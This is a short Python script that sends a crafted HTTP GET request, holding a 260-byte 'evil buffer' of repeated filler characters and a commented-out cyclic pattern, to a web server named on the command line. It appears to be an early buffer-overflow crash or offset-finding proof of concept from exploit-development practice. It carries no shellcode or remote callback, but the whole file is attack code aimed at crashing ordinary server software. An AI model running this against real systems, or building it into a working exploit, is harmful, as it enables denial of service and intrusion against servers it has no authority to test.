#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 80
  size = 260
  
  httpMethod = b"GET /"
  #inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"
  inputBuffer = b"\x41" * 130
  inputBuffer+= b"\x42" * 130
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
